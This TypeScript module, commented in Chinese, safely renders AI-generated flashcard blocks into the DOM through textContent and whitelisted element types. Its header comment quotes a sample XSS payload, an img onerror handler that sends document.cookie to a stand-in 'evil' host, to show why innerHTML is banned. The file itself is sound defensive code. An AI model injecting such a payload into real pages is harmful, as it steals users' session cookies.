/**
 * Block → DOM 的**安全**渲染（二期安全底线，改这个文件前必读）。
 *
 * ══════════════════════════════════════════════════════════
 * 铁律：**绝不把 AI 输出当 HTML 插进 DOM**
 * ══════════════════════════════════════════════════════════
 *
 * 卡片内容是 AI 生成的（录入时由模型拆知识点、写例句）。如果直接
 * `el.innerHTML = block.content`，那么一条 `<img src=x onerror=fetch('//evil/'+document.cookie)>`
 * 就能在用户打开卡片的瞬间发请求、偷数据。
 *
 * 所以这个文件里：
 * - **不出现 `innerHTML` / `outerHTML` / `insertAdjacentHTML` / `document.write`**（全局搜索可验证）；
 * - 所有文本一律走 `document.createTextNode()` / `textContent`，由浏览器负责转义；
 * - 结构由固定的标签拼出来，`type` 只走 `switch` 白名单，未知类型降级成纯文本段落。
 *
 * 结果就是：`<script>alert(1)</script>` 会**原样显示成这行字**，不弹窗、不发请求。
 */
import { KC } from './config';
import { sanitizeText } from './kcModel';
import type { Block } from './kcTypes';

/** 允许出现在 `class` 里的语言名（只保留字母数字和 +#-），防止 `lang` 被用来注入属性 */
const LANG_SAFE_RE = /[^A-Za-z0-9+#-]/g;

/** 卡片块的根 class（样式都在 src/styles/kc.css 里） */
export const BLOCK_CLASS = 'kc-block';

/**
 * 建元素 + 塞纯文本（这个文件的唯一入口，**不要绕过它去拼 HTML**）。
 * @param tag 标签名
 * @param className class（可空）
 * @param text 文本（走 textContent，自动转义）
 */
function el(tag: string, className: string, text?: string): HTMLElement {
  const node = document.createElement(tag);
  if (className !== '') node.className = className;
  if (text !== undefined) node.textContent = sanitizeText(text);
  return node;
}

/**
 * 建一个带 `kc-block` 根 class 的容器。
 * @param type 块类型（只作 class 后缀，不参与任何解析）
 */
function wrap(type: string): HTMLElement {
  return el('div', `${BLOCK_CLASS} ${BLOCK_CLASS}--${type}`);
}

/**
 * 多行文本 → 保留换行的元素。
 * 说明：`textContent` 里 `\n` 在 HTML 中不换行，所以这里用 CSS 的 `white-space: pre-wrap`
 * （样式在 kc.css），**不是**把 `\n` 换成 `<br>`——那又是拼 HTML 了。
 * @param tag 标签名
 * @param className class
 * @param text 文本
 */
function textEl(tag: string, className: string, text: string): HTMLElement {
  const node = el(tag, className, text);
  node.classList.add('kc-preserve-lines');
  return node;
}

/**
 * 渲染单个块。
 *
 * 对未知/损坏的块：**降级渲染为纯文本，不抛异常、不白屏**。
 * @param b 块
 */
export function renderBlock(b: Block): HTMLElement {
  // 入参可能来自云端（结构不保证），先做一层宽容处理
  if (b === null || typeof b !== 'object') return renderFallback('');

  switch (b.type) {
    case 'heading':
      return wrapHeading(b.content ?? '');
    case 'text':
      return wrapText('text', b.content ?? '');
    case 'quote':
      return wrapText('quote', b.content ?? '');
    case 'tip':
      return wrapText('tip', b.content ?? '');
    case 'example':
      return renderExample(b);
    case 'list':
      return renderList(b);
    case 'table':
      return renderTable(b);
    case 'code':
      return renderCode(b);
    default:
      // 未知类型：整块降级成纯文本，绝不抛异常
      return renderFallback(typeof b.content === 'string' ? b.content : '');
  }
}

/**
 * 渲染小标题块。
 * @param content 标题文本
 */
function wrapHeading(content: string): HTMLElement {
  const box = wrap('heading');
  box.appendChild(el('h3', 'kc-heading', content));
  return box;
}

/**
 * 渲染一个「段落型」块（text / quote / tip）。
 * @param type 块类型
 * @param content 正文
 */
function wrapText(type: 'text' | 'quote' | 'tip', content: string): HTMLElement {
  const box = wrap(type);
  box.appendChild(textEl('p', `kc-${type}`, content));
  return box;
}

/**
 * 例句块：英文例句 + 下方小字翻译 + 可选补充说明。
 * @param b 块
 */
function renderExample(b: Block): HTMLElement {
  const box = wrap('example');
  box.appendChild(textEl('p', 'kc-example-sentence', b.content ?? ''));
  const translation = sanitizeText(b.translation ?? '');
  if (translation.trim() !== '') box.appendChild(textEl('p', 'kc-example-translation', translation));
  const note = sanitizeText(b.note ?? '');
  if (note.trim() !== '') box.appendChild(textEl('p', 'kc-example-note', note));
  return box;
}

/**
 * 列表块：每项一个 `<li>`，文本走 `textContent`。
 * @param b 块
 */
function renderList(b: Block): HTMLElement {
  const box = wrap('list');
  const list = document.createElement('ul');
  list.className = 'kc-list';
  const items = Array.isArray(b.items) ? b.items : [];
  for (const item of items) {
    const li = el('li', 'kc-list-item', typeof item === 'string' ? item : String(item));
    list.appendChild(li);
  }
  box.appendChild(list);
  return box;
}

/**
 * 表格块：**所有行都是数据行**，一律渲染成 `<td>`，不生成 `<thead>` / `<th>`。
 *
 * ⚠️ 为什么不做表头（用户明确要求，别改回去）：
 * 1. 表头行占地方。手机上一屏就那么点高度，一行表头吃掉一整行的宽度；
 * 2. 表头常常和卡片标题、正文重复（表头写「关系词 / 先行词 / 从句成分」，
 *    而这张卡的标题本来就叫「定语从句：关系代词 vs 关系副词」）——重复即噪音；
 * 3. 卡片里的表格几乎都是**两列对照**（A 情况 → X，B 情况 → Y），
 *    这种内容两列数据一行一条最好读，套上表头框反而更难扫。
 *
 * ★ 但**渲染端不能假设「数据里没有表头行」**：库里（以及云端、老备份里）
 * 已经存在按旧格式写入的卡片，它们的第一行就是一条表头文本。
 * 这里统一按数据行渲染，于是那行会以普通单元格显示出来——
 * 比「猜哪一行是表头」安全得多：猜错的代价是**悄悄吃掉用户的一行数据**，
 * 而多显示一行只是稍微啰嗦。`KcBlockFields` 的表格编辑器同样按纯网格处理，
 * 用户看到老表头行可以直接改掉或删行。
 *
 * 另一件事：列数按所有行里最宽的一行补空格，避免参差不齐的表格把页面挤歪。
 * @param b 块
 */
function renderTable(b: Block): HTMLElement {
  const box = wrap('table');
  const rows = Array.isArray(b.rows) ? b.rows.filter((r) => Array.isArray(r)) : [];
  if (rows.length === 0) return box;

  const width = rows.reduce((max, r) => Math.max(max, r.length), 0);
  const table = document.createElement('table');
  table.className = 'kc-table';

  const tbody = document.createElement('tbody');
  for (const row of rows) {
    const tr = document.createElement('tr');
    for (let i = 0; i < width; i += 1) {
      tr.appendChild(el('td', 'kc-td', cellText(row, i)));
    }
    tbody.appendChild(tr);
  }
  table.appendChild(tbody);

  box.appendChild(table);
  return box;
}

/**
 * 安全取一个单元格的文本。
 * @param row 行
 * @param index 列号
 */
function cellText(row: string[], index: number): string {
  const v = row[index];
  return typeof v === 'string' ? v : '';
}

/**
 * 代码块：`<pre><code>`，文本走 `textContent`。
 * `lang` **只**作 CSS class（将来接高亮用），并且先过滤成安全字符集。
 * @param b 块
 */
function renderCode(b: Block): HTMLElement {
  const box = wrap('code');
  const pre = document.createElement('pre');
  pre.className = 'kc-pre';
  const code = el('code', 'kc-code', b.content ?? '');
  const lang = sanitizeText(b.lang ?? '', 24).replace(LANG_SAFE_RE, '');
  if (lang !== '') code.classList.add(`language-${lang}`);
  pre.appendChild(code);
  box.appendChild(pre);
  return box;
}

/**
 * 降级渲染：未知/损坏的块按纯文本段落显示。
 * @param content 文本
 */
function renderFallback(content: string): HTMLElement {
  const box = wrap('unknown');
  const text = sanitizeText(content);
  if (text.trim() !== '') box.appendChild(textEl('p', 'kc-text', text));
  return box;
}

/**
 * 渲染一串块（**推荐用这个**：一次性建好，少触发几次重排）。
 *
 * 返回 `DocumentFragment`，不持有 DOM 引用，交给调用方 `appendChild`。
 * 单个块渲染失败不会影响其他块（出错就降级成纯文本）。
 * @param blocks 块数组
 */
export function renderBlocks(blocks: Block[]): DocumentFragment {
  const frag = document.createDocumentFragment();
  const list = Array.isArray(blocks) ? blocks : [];
  for (const b of list) {
    try {
      frag.appendChild(renderBlock(b));
    } catch (err) {
      // 理论上到不了这里（renderBlock 自己已经兜底），但宁可显示一行错，也不许白屏
      console.warn('[blockRender] 单块渲染失败，已降级', err);
      frag.appendChild(renderFallback(typeof b?.content === 'string' ? b.content : ''));
    }
  }
  return frag;
}

/**
 * 单块文本长度上限（给编辑器做输入限制用）。
 */
export const MAX_BLOCK_TEXT = KC.maxBlockTextLength;
